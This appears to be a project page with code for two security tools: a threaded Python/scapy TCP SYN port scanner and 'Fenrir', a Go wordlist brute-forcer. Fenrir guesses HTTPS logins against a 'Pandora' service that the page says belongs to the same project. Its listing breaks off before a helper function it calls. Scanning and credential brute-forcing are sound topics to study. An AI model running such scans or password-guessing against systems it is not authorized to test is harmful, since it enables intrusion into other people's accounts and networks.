DescriptionCodeExampleDownload <p>A simple TCP SYN port scanner that uses threading to speed up the scanning process.  </p> TCP_PortScanner.py<pre><code>from scapy.all import IP, TCP, RandShort, sr1, send
from concurrent.futures import ThreadPoolExecutor
from rich.table import Table
from rich.console import Console

class Scanner:
    def __init__(self, target: str, ports: str) -&gt; None:
        self._target = target
        if '-' in ports:
            self._ports = self._port_range(ports)
        elif ',' in ports:
            self._ports = [int(port.strip()) for port in ports.split(",")]
        else:
            self._ports = [int(ports)]

    def _port_range(self, ports: str):
        start, end = map(int, ports.split('-'))
        return list(range(start, end + 1))

    def _scan(self, port: int):
        pkt = IP(dst=self._target)/TCP(sport=RandShort(), dport=port, flags="S")
        resp = sr1(pkt, timeout=2, verbose=False)

        if resp is None:
            return [port, "Filtered or No Response"]
        elif resp.haslayer(TCP):
            flag = resp[TCP].flags
            if flag == 0x12:
                send(IP(dst=self._target)/TCP(dport=port, sport=RandShort(), flags="R"), verbose=False)
                return [port, "Open"]
            elif flag == 0x14:
                return [port, "Closed"]
        return [port, "Unknown"]

    def scan(self):
        console = Console()
        table = Table(show_header=True, header_style="none", show_lines=False)
        table.add_column("Port", justify="right", style="none")
        table.add_column("Status", justify="left", style="none")

        with ThreadPoolExecutor() as executor:
            results = executor.map(self._scan, self._ports)
            for port, status in results:
                table.add_row(str(port), status)
        console.print(table)
</code></pre> scanner.py<pre><code>from TCP_PortScanner import Scanner
scanner = Scanner("192.168.1.1", "20-25")
scanner.scan()
</code></pre> <p></p>

DescriptionCodeHelpDownload <p>Fenrir is a brute-forcing tool designed specifically to target the Pandora service as part of this project. It operates by sending HTTPS requests with credentials sourced from a dictionary. The tool halts either upon successful authentication with valid credentials or after exhausting all entries in the wordlist without success.</p> main.go<pre><code>package main
import (
    "bufio"
    "bytes"
    "crypto/tls"
    "flag"
    "fmt"
    "log"
    "net/http"
    "os"
    "strings"
    "time"
)
func main() {
    target := flag.String("t", "", "Target host (IP or domain)")
    port := flag.Int("s", 0, "Port number for the Pandora server")
    users := flag.String("u", "", "File path to the list of usernames")
    passwords := flag.String("p", "", "File path to the password dictionary")
    flag.Parse()
    if *target == "" || *port == 0 || *users == "" || *passwords == "" {
        fmt.Println("Error: Missing required flags.")
        flag.Usage()
        os.Exit(1)
    }
    userDict, err := os.Open(*users)
    if err != nil {
        log.Fatal(err)
    }
    defer userDict.Close()
    userScanner := bufio.NewScanner(userDict)
    passwordsDict, err := os.Open(*passwords)
    if err != nil {
        log.Fatal(err)
    }
    defer passwordsDict.Close()
    body := []byte(`"secret-id":"secretID"`)
    for userScanner.Scan() {
        user := strings.TrimSpace(userScanner.Text())
        passwordsDict.Seek(0, 0)
        passwordScanner := bufio.NewScanner(passwordsDict)
        for passwordScanner.Scan() {
            password := strings.TrimSpace(passwordScanner.Text())
            re, err := sendHTTPRequest("GET", fmt.Sprintf("https://%s:%d/secret", *target, *port), user, password, string(body))
            if err == nil {
                if re.StatusCode != 401 &amp;&amp; re.StatusCode != 500 {
                    log.Printf("Account Found: Username: %s, Password: %s (Success)\n", user, password)
                    break
                } else {
                    log.Printf("Account Check - Username: %s, Password: %s\n", user, password)
                }
            }
        }
    }
}
